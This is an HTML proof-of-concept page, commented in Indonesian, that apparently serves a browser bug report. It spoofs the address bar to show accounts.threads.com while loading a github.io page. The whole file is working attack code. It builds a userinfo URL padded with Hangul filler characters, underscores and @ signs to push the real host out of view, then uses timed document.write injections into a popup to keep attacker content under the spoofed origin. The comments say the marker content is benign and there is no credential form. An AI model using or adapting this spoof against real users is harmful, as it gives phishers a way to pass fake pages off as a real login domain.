<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>poc</title>
</head>
<body>

<button id="go">open.threads.com</button>

<script>
// === Address-bar spoofing PoC (predikat: shown-origin != real-origin) ===
// CHAIN: userinfo-truncation omnibox spoof + nav-timing document.write body injection
// Konten marker jinak. Buktikan predikat -> screenshot -> STOP -> lapor. Tanpa form kredensial.

var SPOOF_HOST = "accounts.threads.com";                 // host yang dipaksa tampil di omnibox

// padding: whitespace + Hangul-filler + underscore + deretan @ -> host ASLI terdorong keluar layar
var PAD =
  "%20%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4%20%E3%85%A4%E3%85%A4%E3%85%A4%E3%85%A4" +
  "__________________________________________________________________" +
  "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@";

var REAL = "xnxrx.github.io/xnurx/threads.html";         // halaman MILIKMU yang benar-benar dimuat
var SPOOF_URL = "https://" + SPOOF_HOST + PAD + REAL;    // https://<shown>@<real>

// body jinak yang dilukis selagi omnibox menampilkan host palsu
var BODY =
  "<!doctype html><meta charset=utf-8>" +
  "<meta name=viewport content='width=device-width,initial-scale=1'>" +
  "<title>" + SPOOF_HOST + "</title>" +
  "<body style=font:16px system-ui;padding:24px><p>KICAU MANIA</p>";

function inject(w){ try{ w.document.open(); w.document.write(BODY); w.document.close(); }catch(e){} }

document.getElementById("go").onclick = function(){
  // 1) buka window yang masih kita miliki (about:blank = same-origin, writable)
  var w = window.open("about:blank", "_blank", "width=400,height=640");
  if(!w){ alert("popup blocked"); return; }

  // 2) lukis konten SEKARANG, selagi akses DOM masih ada
  inject(w);

  // 3) navigasi ke URL ber-userinfo -> omnibox commit ke accounts.threads.com
  setTimeout(function(){ try{ w.location = SPOOF_URL; }catch(e){} }, 300);

  // 4) lukis ulang menembus jendela pre-commit supaya body lama bertahan di bawah host baru
  [900, 1400, 1850, 2400, 3000].forEach(function(t){ setTimeout(function(){ inject(w); }, t); });

  // predikat terpenuhi bila omnibox = accounts.threads.com DAN body = konten penyerang
};
</script>

</body>
</html>
